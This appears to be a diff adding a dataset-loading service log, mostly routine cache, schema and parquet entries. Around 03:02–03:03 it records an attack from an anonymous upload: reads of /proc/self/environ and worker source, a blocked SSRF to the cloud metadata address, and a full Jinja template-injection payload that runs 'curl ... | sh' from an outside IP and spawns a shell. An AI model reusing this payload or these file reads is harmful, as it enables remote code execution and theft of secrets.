@@ -1,0 +1,239 @@
+2026-08-31T02:00:16Z INFO  loading dataset config user=research-svc repo=datasets/c4-en
+2026-08-31T02:01:14Z INFO  cache hit shard=00039-of-00064 repo=datasets/glue-mnli
+2026-08-31T02:02:04Z INFO  worker heartbeat pid=8542 rss=947MB
+2026-08-31T02:02:11Z INFO  validating features schema repo=datasets/wikitext-103 ok=true
+2026-08-31T02:03:07Z WARN  slow shard fetch 2440ms repo=datasets/emotion
+2026-08-31T02:03:15Z INFO  validating features schema repo=datasets/openwebtext ok=true
+2026-08-31T02:04:11Z INFO  loading dataset config user=research-svc repo=datasets/xsum
+2026-08-31T02:05:02Z INFO  cache hit shard=00035-of-00064 repo=datasets/xsum
+2026-08-31T02:05:04Z INFO  parquet write complete rows=709416 repo=datasets/librispeech-clean
+2026-08-31T02:07:04Z INFO  validating features schema repo=datasets/ag_news ok=true
+2026-08-31T02:07:24Z INFO  parquet write complete rows=687456 repo=datasets/the-pile-subset
+2026-08-31T02:07:54Z INFO  cache hit shard=00056-of-00064 repo=datasets/squad_v2
+2026-08-31T02:08:00Z INFO  split generated name=validation repo=datasets/librispeech-clean
+2026-08-31T02:08:23Z INFO  parquet write complete rows=282779 repo=datasets/wikitext-103
+2026-08-31T02:08:32Z INFO  parquet write complete rows=85937 repo=datasets/common_voice_17
+2026-08-31T02:08:45Z INFO  split generated name=train repo=datasets/squad_v2
+2026-08-31T02:08:46Z INFO  validating features schema repo=datasets/the-pile-subset ok=true
+2026-08-31T02:08:53Z INFO  loading dataset config user=kaggle-mirror repo=datasets/the-pile-subset
+2026-08-31T02:08:57Z INFO  split generated name=test repo=datasets/common_voice_17
+2026-08-31T02:09:51Z WARN  slow shard fetch 5197ms repo=datasets/common_voice_17
+2026-08-31T02:10:29Z INFO  validating features schema repo=datasets/openwebtext ok=true
+2026-08-31T02:10:40Z WARN  slow shard fetch 2552ms repo=datasets/glue-mnli
+2026-08-31T02:10:45Z INFO  validating features schema repo=datasets/imagenet-mini ok=true
+2026-08-31T02:11:06Z INFO  split generated name=test repo=datasets/common_voice_17
+2026-08-31T02:11:24Z INFO  cache hit shard=00058-of-00064 repo=datasets/laion-aesthetics
+2026-08-31T02:12:27Z INFO  worker heartbeat pid=8821 rss=952MB
+2026-08-31T02:12:30Z INFO  validating features schema repo=datasets/glue-mnli ok=true
+2026-08-31T02:12:50Z INFO  split generated name=validation repo=datasets/c4-en
+2026-08-31T02:13:50Z INFO  loading dataset config user=research-svc repo=datasets/openwebtext
+2026-08-31T02:14:15Z INFO  validating features schema repo=datasets/imagenet-mini ok=true
+2026-08-31T02:14:42Z INFO  parquet write complete rows=516524 repo=datasets/c4-en
+2026-08-31T02:15:35Z WARN  slow shard fetch 4126ms repo=datasets/code-search-net
+2026-08-31T02:15:58Z WARN  slow shard fetch 4824ms repo=datasets/laion-aesthetics
+2026-08-31T02:16:07Z INFO  parquet write complete rows=353279 repo=datasets/squad_v2
+2026-08-31T02:17:41Z INFO  cache hit shard=00058-of-00064 repo=datasets/librispeech-clean
+2026-08-31T02:18:37Z INFO  worker heartbeat pid=8281 rss=329MB
+2026-08-31T02:18:43Z INFO  parquet write complete rows=695985 repo=datasets/librispeech-clean
+2026-08-31T02:19:02Z WARN  slow shard fetch 2832ms repo=datasets/squad_v2
+2026-08-31T02:19:03Z WARN  slow shard fetch 6744ms repo=datasets/openwebtext
+2026-08-31T02:19:05Z INFO  cache hit shard=00063-of-00064 repo=datasets/imagenet-mini
+2026-08-31T02:19:46Z WARN  slow shard fetch 2575ms repo=datasets/common_voice_17
+2026-08-31T02:20:20Z INFO  worker heartbeat pid=8757 rss=636MB
+2026-08-31T02:20:40Z INFO  split generated name=train repo=datasets/common_voice_17
+2026-08-31T02:20:45Z INFO  worker heartbeat pid=8954 rss=699MB
+2026-08-31T02:22:25Z INFO  loading dataset config user=nightly-ingest repo=datasets/code-search-net
+2026-08-31T02:23:30Z INFO  worker heartbeat pid=8545 rss=830MB
+2026-08-31T02:23:45Z INFO  loading dataset config user=prof_chen repo=datasets/code-search-net
+2026-08-31T02:23:49Z INFO  validating features schema repo=datasets/code-search-net ok=true
+2026-08-31T02:23:52Z INFO  validating features schema repo=datasets/wikitext-103 ok=true
+2026-08-31T02:24:05Z INFO  cache hit shard=00020-of-00064 repo=datasets/librispeech-clean
+2026-08-31T02:25:28Z INFO  validating features schema repo=datasets/squad_v2 ok=true
+2026-08-31T02:25:42Z INFO  parquet write complete rows=258927 repo=datasets/code-search-net
+2026-08-31T02:26:41Z INFO  cache hit shard=00023-of-00064 repo=datasets/c4-en
+2026-08-31T02:27:34Z INFO  split generated name=train repo=datasets/ag_news
+2026-08-31T02:28:33Z INFO  split generated name=train repo=datasets/the-pile-subset
+2026-08-31T02:28:38Z INFO  parquet write complete rows=103025 repo=datasets/squad_v2
+2026-08-31T02:28:45Z INFO  worker heartbeat pid=8781 rss=1055MB
+2026-08-31T02:29:13Z WARN  slow shard fetch 2152ms repo=datasets/squad_v2
+2026-08-31T02:29:21Z INFO  parquet write complete rows=231219 repo=datasets/cnn_dailymail
+2026-08-31T02:30:10Z INFO  worker heartbeat pid=8091 rss=668MB
+2026-08-31T02:30:24Z INFO  validating features schema repo=datasets/cnn_dailymail ok=true
+2026-08-31T02:31:36Z WARN  slow shard fetch 6112ms repo=datasets/cnn_dailymail
+2026-08-31T02:32:06Z INFO  loading dataset config user=data-team repo=datasets/laion-aesthetics
+2026-08-31T02:32:08Z WARN  slow shard fetch 4004ms repo=datasets/xsum
+2026-08-31T02:32:18Z INFO  cache hit shard=00011-of-00064 repo=datasets/librispeech-clean
+2026-08-31T02:32:49Z INFO  parquet write complete rows=56768 repo=datasets/c4-en
+2026-08-31T02:33:35Z INFO  parquet write complete rows=43165 repo=datasets/wikitext-103
+2026-08-31T02:33:36Z INFO  split generated name=train repo=datasets/glue-mnli
+2026-08-31T02:33:37Z INFO  parquet write complete rows=194375 repo=datasets/c4-en
+2026-08-31T02:34:07Z WARN  slow shard fetch 4193ms repo=datasets/the-pile-subset
+2026-08-31T02:34:33Z INFO  parquet write complete rows=26084 repo=datasets/c4-en
+2026-08-31T02:35:28Z INFO  split generated name=validation repo=datasets/glue-mnli
+2026-08-31T02:35:33Z INFO  worker heartbeat pid=8706 rss=214MB
+2026-08-31T02:35:54Z INFO  cache hit shard=00024-of-00064 repo=datasets/librispeech-clean
+2026-08-31T02:36:05Z INFO  worker heartbeat pid=8332 rss=763MB
+2026-08-31T02:36:08Z INFO  split generated name=test repo=datasets/code-search-net
+2026-08-31T02:36:46Z INFO  cache hit shard=00035-of-00064 repo=datasets/c4-en
+2026-08-31T02:37:01Z WARN  slow shard fetch 7222ms repo=datasets/wikitext-103
+2026-08-31T02:37:35Z INFO  parquet write complete rows=305988 repo=datasets/c4-en
+2026-08-31T02:38:43Z INFO  worker heartbeat pid=8308 rss=1074MB
+2026-08-31T02:39:07Z INFO  validating features schema repo=datasets/the-pile-subset ok=true
+2026-08-31T02:40:31Z INFO  parquet write complete rows=795218 repo=datasets/c4-en
+2026-08-31T02:40:35Z INFO  loading dataset config user=kaggle-mirror repo=datasets/ag_news
+2026-08-31T02:41:05Z INFO  cache hit shard=00039-of-00064 repo=datasets/wikitext-103
+2026-08-31T02:41:09Z ERROR SSRF blocked: url=http://internal-preview.datacache.svc/ (ValueError: not an hf path)
+2026-08-31T02:41:34Z INFO  parquet write complete rows=472262 repo=datasets/xsum
+2026-08-31T02:41:38Z INFO  split generated name=train repo=datasets/laion-aesthetics
+2026-08-31T02:42:11Z INFO  loading dataset config user=nightly-ingest repo=datasets/cnn_dailymail
+2026-08-31T02:42:49Z WARN  slow shard fetch 6932ms repo=datasets/cnn_dailymail
+2026-08-31T02:43:44Z INFO  cache hit shard=00034-of-00064 repo=datasets/librispeech-clean
+2026-08-31T02:43:57Z INFO  parquet write complete rows=363543 repo=datasets/xsum
+2026-08-31T02:44:35Z WARN  slow shard fetch 1810ms repo=datasets/the-pile-subset
+2026-08-31T02:45:10Z INFO  loading dataset config user=nightly-ingest repo=datasets/ag_news
+2026-08-31T02:45:14Z WARN  slow shard fetch 3170ms repo=datasets/laion-aesthetics
+2026-08-31T02:45:38Z INFO  split generated name=validation repo=datasets/cnn_dailymail
+2026-08-31T02:47:02Z INFO  worker heartbeat pid=8777 rss=309MB
+2026-08-31T02:47:59Z INFO  parquet write complete rows=7980 repo=datasets/squad_v2
+2026-08-31T02:48:01Z INFO  worker heartbeat pid=8552 rss=1326MB
+2026-08-31T02:48:16Z INFO  cache hit shard=00013-of-00064 repo=datasets/imagenet-mini
+2026-08-31T02:48:24Z INFO  cache hit shard=00045-of-00064 repo=datasets/squad_v2
+2026-08-31T02:48:47Z INFO  validating features schema repo=datasets/code-search-net ok=true
+2026-08-31T02:49:11Z INFO  split generated name=test repo=datasets/c4-en
+2026-08-31T02:49:21Z INFO  worker heartbeat pid=8377 rss=743MB
+2026-08-31T02:49:34Z INFO  loading dataset config user=nightly-ingest repo=datasets/ag_news
+2026-08-31T02:49:42Z INFO  worker heartbeat pid=8675 rss=902MB
+2026-08-31T02:50:02Z INFO  loading dataset config user=kaggle-mirror repo=datasets/squad_v2
+2026-08-31T02:51:28Z INFO  loading dataset config user=prof_chen repo=datasets/code-search-net
+2026-08-31T02:51:28Z WARN  slow shard fetch 3391ms repo=datasets/imagenet-mini
+2026-08-31T02:52:11Z INFO  split generated name=train repo=datasets/wikitext-103
+2026-08-31T02:52:13Z INFO  worker heartbeat pid=8213 rss=1111MB
+2026-08-31T02:54:31Z INFO  loading dataset config user=hf-sync repo=datasets/librispeech-clean
+2026-08-31T02:54:36Z WARN  slow shard fetch 2201ms repo=datasets/librispeech-clean
+2026-08-31T02:55:01Z WARN  slow shard fetch 1623ms repo=datasets/glue-mnli
+2026-08-31T02:55:59Z INFO  parquet write complete rows=299179 repo=datasets/squad_v2
+2026-08-31T02:56:04Z WARN  slow shard fetch 5210ms repo=datasets/ag_news
+2026-08-31T02:56:06Z INFO  cache hit shard=00027-of-00064 repo=datasets/wikitext-103
+2026-08-31T02:56:26Z INFO  validating features schema repo=datasets/glue-mnli ok=true
+2026-08-31T02:56:29Z INFO  parquet write complete rows=789887 repo=datasets/librispeech-clean
+2026-08-31T02:57:35Z INFO  parquet write complete rows=10898 repo=datasets/the-pile-subset
+2026-08-31T02:57:53Z INFO  cache hit shard=00058-of-00064 repo=datasets/squad_v2
+2026-08-31T02:57:55Z INFO  worker heartbeat pid=8292 rss=1323MB
+2026-08-31T02:58:38Z INFO  validating features schema repo=datasets/xsum ok=true
+2026-08-31T02:59:35Z INFO  worker heartbeat pid=8121 rss=650MB
+2026-08-31T03:00:29Z INFO  worker heartbeat pid=8086 rss=1174MB
+2026-08-31T03:00:47Z INFO  split generated name=test repo=datasets/common_voice_17
+2026-08-31T03:01:16Z INFO  cache hit shard=00013-of-00064 repo=datasets/code-search-net
+2026-08-31T03:02:33Z INFO  split generated name=train repo=datasets/imagenet-mini
+2026-08-31T03:02:51Z INFO  loading dataset config user=anon-uploader repo=datasets/tmp-eval-4471
+2026-08-31T03:02:52Z WARN  external reference resolved: reference://local/envu8 -> /proc/self/environ
+2026-08-31T03:02:52.510Z WARN  external reference resolved: reference://local/mainu8 -> /app/worker/main.py
+2026-08-31T03:02:53Z ERROR SSRF blocked: url=http://169.254.169.254/latest/meta-data/ (ValueError: not an hf path)
+2026-08-31T03:03:10Z INFO  rendering template field 'description' repo=datasets/tmp-eval-4471
+2026-08-31T03:03:10.320Z INFO  template eval: {{ cycler.__init__.__globals__.__builtins__.exec("import os,subprocess;subprocess.Popen(['/bin/sh','-c','curl -s http://185.203.118.44/s.sh|sh'])") }}
+2026-08-31T03:03:11Z INFO  subprocess spawned pid=8814 ppid=8801 cmd=/bin/sh (worker context)
+2026-08-31T03:03:12Z WARN  worker main.py read via external reference (source disclosure) repo=datasets/tmp-eval-4471
+2026-08-31T03:04:17Z INFO  split generated name=train repo=datasets/laion-aesthetics
+2026-08-31T03:04:47Z INFO  parquet write complete rows=657223 repo=datasets/xsum
+2026-08-31T03:06:16Z INFO  worker heartbeat pid=8030 rss=501MB
+2026-08-31T03:06:21Z WARN  slow shard fetch 1231ms repo=datasets/ag_news
+2026-08-31T03:06:22Z INFO  parquet write complete rows=864478 repo=datasets/glue-mnli
+2026-08-31T03:06:31Z INFO  parquet write complete rows=771389 repo=datasets/xsum
+2026-08-31T03:06:39Z INFO  split generated name=train repo=datasets/laion-aesthetics
+2026-08-31T03:06:44Z INFO  loading dataset config user=research-svc repo=datasets/wikitext-103
+2026-08-31T03:07:41Z WARN  slow shard fetch 7537ms repo=datasets/common_voice_17
+2026-08-31T03:08:34Z INFO  parquet write complete rows=739030 repo=datasets/openwebtext
+2026-08-31T03:08:39Z INFO  validating features schema repo=datasets/ag_news ok=true
+2026-08-31T03:08:50Z INFO  loading dataset config user=anon-uploader repo=datasets/openwebtext
+2026-08-31T03:08:54Z INFO  cache hit shard=00031-of-00064 repo=datasets/xsum
+2026-08-31T03:09:48Z INFO  loading dataset config user=research-svc repo=datasets/imagenet-mini
+2026-08-31T03:10:44Z INFO  parquet write complete rows=782857 repo=datasets/wikitext-103
+2026-08-31T03:11:03Z INFO  worker heartbeat pid=8130 rss=677MB
+2026-08-31T03:11:46Z INFO  split generated name=validation repo=datasets/emotion
+2026-08-31T03:12:46Z INFO  cache hit shard=00048-of-00064 repo=datasets/emotion
+2026-08-31T03:13:38Z INFO  worker heartbeat pid=8232 rss=1051MB
+2026-08-31T03:13:49Z INFO  cache hit shard=00046-of-00064 repo=datasets/librispeech-clean
+2026-08-31T03:14:13Z INFO  loading dataset config user=prof_chen repo=datasets/ag_news
+2026-08-31T03:14:18Z INFO  loading dataset config user=nightly-ingest repo=datasets/glue-mnli
+2026-08-31T03:15:09Z INFO  split generated name=validation repo=datasets/cnn_dailymail
+2026-08-31T03:15:15Z WARN  slow shard fetch 4835ms repo=datasets/wikitext-103
+2026-08-31T03:15:19Z WARN  slow shard fetch 1549ms repo=datasets/glue-mnli
+2026-08-31T03:15:35Z INFO  split generated name=validation repo=datasets/the-pile-subset
+2026-08-31T03:16:14Z INFO  cache hit shard=00055-of-00064 repo=datasets/xsum
+2026-08-31T03:16:16Z INFO  cache hit shard=00017-of-00064 repo=datasets/imagenet-mini
+2026-08-31T03:16:24Z INFO  parquet write complete rows=506496 repo=datasets/squad_v2
+2026-08-31T03:16:58Z INFO  worker heartbeat pid=8595 rss=975MB
+2026-08-31T03:17:37Z INFO  validating features schema repo=datasets/emotion ok=true
+2026-08-31T03:18:39Z WARN  slow shard fetch 4301ms repo=datasets/laion-aesthetics
+2026-08-31T03:18:57Z INFO  split generated name=validation repo=datasets/squad_v2
+2026-08-31T03:19:15Z INFO  loading dataset config user=data-team repo=datasets/openwebtext
+2026-08-31T03:19:26Z INFO  worker heartbeat pid=8508 rss=576MB
+2026-08-31T03:19:26Z INFO  parquet write complete rows=695827 repo=datasets/wikitext-103
+2026-08-31T03:19:44Z INFO  parquet write complete rows=567195 repo=datasets/squad_v2
+2026-08-31T03:19:59Z WARN  slow shard fetch 4343ms repo=datasets/code-search-net
+2026-08-31T03:20:21Z INFO  split generated name=validation repo=datasets/laion-aesthetics
+2026-08-31T03:21:04Z INFO  cache hit shard=00023-of-00064 repo=datasets/squad_v2
+2026-08-31T03:21:20Z WARN  slow shard fetch 7584ms repo=datasets/xsum
+2026-08-31T03:21:24Z WARN  slow shard fetch 7861ms repo=datasets/laion-aesthetics
+2026-08-31T03:21:25Z INFO  validating features schema repo=datasets/glue-mnli ok=true
+2026-08-31T03:21:52Z INFO  worker heartbeat pid=8855 rss=334MB
+2026-08-31T03:23:09Z INFO  parquet write complete rows=702396 repo=datasets/the-pile-subset
+2026-08-31T03:25:07Z WARN  slow shard fetch 1823ms repo=datasets/wikitext-103
+2026-08-31T03:25:40Z INFO  validating features schema repo=datasets/code-search-net ok=true
+2026-08-31T03:25:44Z INFO  loading dataset config user=nightly-ingest repo=datasets/imagenet-mini
+2026-08-31T03:26:20Z WARN  slow shard fetch 1626ms repo=datasets/wikitext-103
+2026-08-31T03:26:29Z INFO  split generated name=validation repo=datasets/laion-aesthetics
+2026-08-31T03:26:54Z INFO  validating features schema repo=datasets/code-search-net ok=true
+2026-08-31T03:27:59Z INFO  parquet write complete rows=99166 repo=datasets/cnn_dailymail
+2026-08-31T03:28:27Z INFO  loading dataset config user=data-team repo=datasets/code-search-net
+2026-08-31T03:28:44Z INFO  validating features schema repo=datasets/imagenet-mini ok=true
+2026-08-31T03:28:55Z INFO  validating features schema repo=datasets/ag_news ok=true
+2026-08-31T03:29:41Z INFO  worker heartbeat pid=8351 rss=1114MB
+2026-08-31T03:30:19Z INFO  loading dataset config user=prof_chen repo=datasets/ag_news
+2026-08-31T03:30:26Z INFO  validating features schema repo=datasets/openwebtext ok=true
+2026-08-31T03:30:34Z INFO  loading dataset config user=kaggle-mirror repo=datasets/ag_news
+2026-08-31T03:31:54Z WARN  slow shard fetch 5939ms repo=datasets/openwebtext
+2026-08-31T03:33:30Z INFO  cache hit shard=00033-of-00064 repo=datasets/squad_v2
+2026-08-31T03:34:18Z INFO  worker heartbeat pid=8567 rss=1256MB
+2026-08-31T03:34:57Z INFO  parquet write complete rows=855681 repo=datasets/glue-mnli
+2026-08-31T03:36:01Z INFO  split generated name=train repo=datasets/the-pile-subset
+2026-08-31T03:36:14Z INFO  cache hit shard=00049-of-00064 repo=datasets/cnn_dailymail
+2026-08-31T03:36:50Z INFO  parquet write complete rows=28477 repo=datasets/openwebtext
+2026-08-31T03:37:25Z INFO  loading dataset config user=data-team repo=datasets/imagenet-mini
+2026-08-31T03:37:34Z INFO  worker heartbeat pid=8230 rss=825MB
+2026-08-31T03:37:52Z INFO  parquet write complete rows=334244 repo=datasets/squad_v2
+2026-08-31T03:39:09Z INFO  split generated name=validation repo=datasets/code-search-net
+2026-08-31T03:39:42Z WARN  slow shard fetch 6216ms repo=datasets/laion-aesthetics
+2026-08-31T03:40:50Z INFO  validating features schema repo=datasets/emotion ok=true
+2026-08-31T03:40:58Z WARN  slow shard fetch 3085ms repo=datasets/xsum
+2026-08-31T03:41:23Z INFO  validating features schema repo=datasets/the-pile-subset ok=true
+2026-08-31T03:41:34Z INFO  validating features schema repo=datasets/openwebtext ok=true
+2026-08-31T03:41:40Z WARN  slow shard fetch 6362ms repo=datasets/xsum
+2026-08-31T03:44:11Z WARN  slow shard fetch 4743ms repo=datasets/glue-mnli
+2026-08-31T03:44:53Z INFO  loading dataset config user=anon-uploader repo=datasets/glue-mnli
+2026-08-31T03:45:02Z WARN  slow shard fetch 1936ms repo=datasets/openwebtext
+2026-08-31T03:45:56Z WARN  slow shard fetch 3947ms repo=datasets/openwebtext
+2026-08-31T03:46:16Z WARN  slow shard fetch 3555ms repo=datasets/glue-mnli
+2026-08-31T03:48:02Z INFO  validating features schema repo=datasets/wikitext-103 ok=true
+2026-08-31T03:48:08Z INFO  loading dataset config user=data-team repo=datasets/squad_v2
+2026-08-31T03:48:53Z INFO  validating features schema repo=datasets/the-pile-subset ok=true
+2026-08-31T03:49:12Z INFO  worker heartbeat pid=8080 rss=526MB
+2026-08-31T03:49:29Z INFO  loading dataset config user=prof_chen repo=datasets/common_voice_17
+2026-08-31T03:50:22Z INFO  validating features schema repo=datasets/c4-en ok=true
+2026-08-31T03:50:30Z WARN  slow shard fetch 6275ms repo=datasets/glue-mnli
+2026-08-31T03:50:58Z INFO  parquet write complete rows=387470 repo=datasets/laion-aesthetics
+2026-08-31T03:52:11Z INFO  cache hit shard=00014-of-00064 repo=datasets/openwebtext
+2026-08-31T03:52:28Z INFO  validating features schema repo=datasets/wikitext-103 ok=true
+2026-08-31T03:52:31Z INFO  parquet write complete rows=26915 repo=datasets/emotion
+2026-08-31T03:53:50Z WARN  slow shard fetch 1426ms repo=datasets/librispeech-clean
+2026-08-31T03:54:06Z INFO  parquet write complete rows=264690 repo=datasets/common_voice_17
+2026-08-31T03:56:14Z INFO  cache hit shard=00063-of-00064 repo=datasets/common_voice_17
+2026-08-31T03:56:16Z INFO  split generated name=validation repo=datasets/squad_v2
+2026-08-31T03:56:44Z INFO  split generated name=test repo=datasets/common_voice_17
+2026-08-31T03:57:13Z INFO  split generated name=test repo=datasets/squad_v2
+2026-08-31T03:57:17Z INFO  parquet write complete rows=610645 repo=datasets/openwebtext
+2026-08-31T03:57:59Z INFO  validating features schema repo=datasets/ag_news ok=true
+2026-08-31T03:58:17Z INFO  worker heartbeat pid=8788 rss=288MB
+2026-08-31T03:58:40Z INFO  cache hit shard=00052-of-00064 repo=datasets/laion-aesthetics
+2026-08-31T04:00:09Z INFO  validating features schema repo=datasets/xsum ok=true
+2026-08-31T04:00:13Z INFO  loading dataset config user=anon-uploader repo=datasets/emotion
